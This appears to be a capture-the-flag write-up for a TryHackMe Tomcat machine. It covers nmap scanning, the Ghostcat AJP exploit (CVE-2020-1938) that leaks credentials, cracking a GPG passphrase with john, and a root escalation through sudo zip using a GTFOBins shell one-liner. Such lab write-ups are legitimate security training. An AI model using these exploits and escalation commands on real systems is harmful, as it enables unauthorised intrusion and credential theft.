#### IP `10.10.86.161`

#### 1. Scanning

```
 $ nmap -Pn -A 10.10.86.161    
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-11 13:30 EST
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 27.53% done; ETC: 13:30 (0:00:11 remaining)
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 30.93% done; ETC: 13:30 (0:00:16 remaining)
Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 49.12% done; ETC: 13:30 (0:00:16 remaining)
Nmap scan report for 10.10.86.161
Host is up (0.20s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.68 seconds
```

There are 3 open ports: 22,53,8080. There is `Tomcat 9.0.30` as web server.
                                     
I tried to find some place to upload rev shell but without luck as access is forbidden.


#### 2. Finding an exploit

I found an exploit which abuses AJP protocol, which trusts incoming HTTP connections and fitted perfectly for Tomcat 9.0.30.

Here are more informations if needed:

`https://nvd.nist.gov/vuln/detail/CVE-2020-1938`

I downloaded it here `https://www.exploit-db.com/exploits/48143` and ran with python.

Luckily, I got a username and his password, so it was possible to ssh a server.

```
  <description>
     Welcome to GhostCat
	skyfuck:873028***********ksalks
  </description>

</web-app>
```

#### 3. John

In home directory there are two files: one gpg and second asc. I decoded gpg to john's format

```
──(kali㉿kali)-[~]
└─$ gpg2john tryhackme.asc > hash
```

and then bruteforce it.

`john --wordlist=/usr/share/wordlists/rockyou.txt hash`    

So I got a passphrase to open asc file.     1 ⨯

```                                                              
└─$ john hash --show                                     
tryhackme:ale*****ru:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc
```



#### GPG import / decrypt + entering passphrase alexandru to get merlin's pass

`skyfuck@ubuntu:~$ gpg --import tryhackme.asc`

Which gave me username and pass of another user:

`merlin:asuy**********3k12j3kj123`

It was also possible to cat user.txt flag at this point.


#### 6. sudo -l as merlin and then escalate to root

I checked what sudo permissions merlin has:

```
merlin@ubuntu:/home/skyfuck$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

It means that root coumd be obtained with zip.

As always GTFO BINS comes handful:

`https://gtfobins.github.io/gtfobins/zip/`

```
TF=$(mktemp -u)
zip $TF /etc/hosts -T -TT 'sh #'
rm $TF
```

So here it is:

```
merlin@ubuntu:/home/skyfuck$ TF=$(mktemp -u)
merlin@ubuntu:/home/skyfuck$ sudo -u root /usr/bin/zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)

```

and I am root:

```
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls -al
total 32
drwx------  4 root root 4096 Mar 10  2020 .
drwxr-xr-x 22 root root 4096 Mar 10  2020 ..
-rw-------  1 root root   15 Mar 10  2020 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x  2 root root 4096 Mar 10  2020 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   17 Mar 10  2020 root.txt
drwxr-xr-x  2 root root 4096 Mar 10  2020 ufw
# cat root.txt
THM{*********
# 
